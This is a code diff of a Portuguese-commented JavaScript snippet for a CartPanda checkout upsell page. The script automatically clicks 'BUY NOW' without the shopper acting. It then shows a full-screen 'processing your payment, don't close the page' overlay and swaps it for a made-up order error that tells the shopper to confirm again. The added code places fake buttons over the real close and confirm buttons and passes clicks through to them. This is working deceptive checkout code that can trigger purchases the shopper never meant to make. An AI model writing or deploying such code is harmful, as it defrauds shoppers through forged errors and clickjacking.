@@ -15,7 +15,7 @@
             
 <script>
 (function() {
-  // Escopo único para não poluir o global
+  // 1) Inicia tudo no DOMContentLoaded
   document.addEventListener('DOMContentLoaded', init);
 
   function init() {
@@ -24,12 +24,11 @@
     observeModal(overlay);
   }
 
-  // 1) Cria o overlay full-screen com spinner e mensagens
+  // 2) Cria o overlay full-screen com spinner e mensagens
   function createOverlay() {
     // Injeta CSS dinamicamente
     const style = document.createElement('style');
     style.innerHTML = `
-      /* Container do overlay */
       #customOverlay {
         position: fixed;
         top: 0; left: 0;
@@ -43,7 +42,6 @@
         font-family: Arial, sans-serif;
         text-align: center;
       }
-      /* Spinner central */
       #customOverlay .spinner {
         border: 8px solid #f3f3f3;
         border-top: 8px solid #3498db;
@@ -56,7 +54,6 @@
         from { transform: rotate(0deg); }
         to   { transform: rotate(360deg); }
       }
-      /* Mensagens iniciais */
       #customOverlay .message {
         font-size: 1.2em;
         margin: 5px 0;
@@ -64,7 +61,7 @@
     `;
     document.head.appendChild(style);
 
-    // Cria o elemento overlay
+    // Cria o overlay
     const overlay = document.createElement('div');
     overlay.id = 'customOverlay';
     overlay.innerHTML = `
@@ -72,13 +69,13 @@
       <div class="message">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
       <div class="message">PROCESSANDO SEU PAGAMENTO</div>
     `;
-    // Começa interceptando eventos (spinner)
+    // Bloqueia interações inicialmente
     overlay.style.pointerEvents = 'auto';
     document.body.appendChild(overlay);
     return overlay;
   }
 
-  // 2) Dispara clique automático no BUY NOW após 1s
+  // 3) Clique automático no BUY NOW após 1 segundo
   function setupAutoClick() {
     setTimeout(() => {
       const buyLink = document.querySelector('a.cta-button[href*="accepted=yes"]');
@@ -90,7 +87,7 @@
     }, 1000);
   }
 
-  // 3) Observa adição do modal da CartPanda
+  // 4) Observa adição do modal da CartPanda
   function observeModal(overlay) {
     const observer = new MutationObserver((mutations, obs) => {
       for (const m of mutations) {
@@ -109,58 +106,70 @@
     observer.observe(document.body, { childList: true, subtree: true });
   }
 
-  // 4) Transição para estado de ERRO: substitui conteúdo e cria hotspots
+  // 5) Transição para estado de erro: troca conteúdo e adiciona falsos botões
   function enterErrorState(overlay) {
-    // Deixa o overlay transparente a cliques
+    // Permite que cliques passem para os falsos botões
     overlay.style.pointerEvents = 'none';
-    // Substitui somente pelo texto de erro
+    // Substitui conteúdo pelo texto de erro
     overlay.innerHTML = `
       <div class="message">
         HOUVE UM ERRO EM SEU PEDIDO,<br>
         CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
       </div>
     `;
-    placeHotspots();
+    placeFakeButtons();
   }
 
-  // 5) Cria divs transparentes sobre os botões nativos para indicar hotspots
-  function placeHotspots() {
-    const buttons = [
-      'cartpanda-close-modal-btn',
-      'cartpanda-payment-confirmation'
+  // 6) Cria “fake buttons” sobre os originais, capta e repassa o clique
+  function placeFakeButtons() {
+    const configs = [
+      { id: 'cartpanda-close-modal-btn', label: 'NÃO, OBRIGADO' },
+      { id: 'cartpanda-payment-confirmation', label: 'CONFIRMAR' }
     ];
 
-    buttons.forEach(id => {
-      const btn = document.getElementById(id);
-      if (!btn) {
-        console.warn(`Auto-upsell: botão ${id} não encontrado`);
+    configs.forEach(cfg => {
+      const realBtn = document.getElementById(cfg.id);
+      if (!realBtn) {
+        console.warn(`Auto-upsell: botão ${cfg.id} não encontrado`);
         return;
       }
-      const hotspot = document.createElement('div');
-      hotspot.className = 'customHotspot';
-      hotspot.dataset.target = id;
-      // estilos base
-      Object.assign(hotspot.style, {
+
+      const fake = document.createElement('button');
+      fake.textContent = cfg.label;
+      Object.assign(fake.style, {
         position: 'fixed',
-        background: 'transparent',
-        pointerEvents: 'none',
-        border: '2px dashed rgba(0,0,0,0.3)',
+        cursor: 'pointer',
+        fontSize: '1em',
+        fontFamily: 'Arial, sans-serif',
+        background: 'rgba(0,0,0,0.05)',
+        border: '2px dashed #333',
+        color: '#333',
         zIndex: 1000000
       });
-      document.body.appendChild(hotspot);
+      document.body.appendChild(fake);
 
-      // atualiza posição inicial e em resize
       function update() {
-        const r = btn.getBoundingClientRect();
-        hotspot.style.top    = r.top    + 'px';
-        hotspot.style.left   = r.left   + 'px';
-        hotspot.style.width  = r.width  + 'px';
-        hotspot.style.height = r.height + 'px';
+        const r = realBtn.getBoundingClientRect();
+        Object.assign(fake.style, {
+          top:    `${r.top}px`,
+          left:   `${r.left}px`,
+          width:  `${r.width}px`,
+          height: `${r.height}px`,
+          lineHeight: `${r.height}px`,
+          textAlign: 'center'
+        });
       }
       update();
       window.addEventListener('resize', update);
+
+      fake.addEventListener('click', e => {
+        e.preventDefault();
+        e.stopPropagation();
+        realBtn.click();
+      });
     });
   }
+
 })();
 </script>
 
